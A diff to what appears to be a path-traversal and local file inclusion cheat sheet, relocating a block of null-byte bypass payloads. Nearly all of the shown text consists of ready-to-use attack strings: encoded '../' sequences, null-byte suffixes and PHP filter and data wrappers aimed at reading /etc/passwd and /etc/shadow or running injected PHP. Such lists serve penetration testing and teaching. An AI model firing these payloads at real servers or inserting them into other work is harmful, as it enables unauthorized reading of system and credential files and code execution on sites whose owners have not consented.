@@ -21,6 +21,22 @@ ___
 6. Using null byte >> ../../../etc/passwd%00.png
 7. Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
 8. Using Data wrappers >> data:text/plain,<?php%20phpinfo();%20?>
+
+#### File extension with null byte bypass
+```
+/etc/passwd%00
+../../../etc/passwd%00
+..//..//..//..//etc/passwd%00
+....//....//....//....//etc/passwd%00
+/var/www/images/../../../etc/passwd%00
+/var/www/images/..//..//..//..//etc/passwd%00
+/var/www/images/....//....//....//....//etc/passwd%00
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
+..%252f..%252f..%252fetc/passwd%00
+%2Fetc%2Fpasswd%00
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
+%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd%00
+```
 #### Wordlist
 ```txt
 /etc/passwd
@@ -90,21 +106,6 @@ ___
 %2fvar%2fwww%2fimages%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 %2e%2e%2f%2e%2e%2fetc%2fshadow%00
 %2fvar%2fwww%2fimages%2f..%2f..%2f..%2f..%2fetc%2fshadow%00
-```
-#### File extension with null byte bypass
-```
-/etc/passwd%00
-../../../etc/passwd%00
-..//..//..//..//etc/passwd%00
-....//....//....//....//etc/passwd%00
-/var/www/images/../../../etc/passwd%00
-/var/www/images/..//..//..//..//etc/passwd%00
-/var/www/images/....//....//....//....//etc/passwd%00
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
-..%252f..%252f..%252fetc/passwd%00
-%2Fetc%2Fpasswd%00
-%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
-%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd%00
 ```
 ### External Cheat Sheet
 https://github.com/JahTheTrueGod/Directory-Traversal-Cheat-Sheet
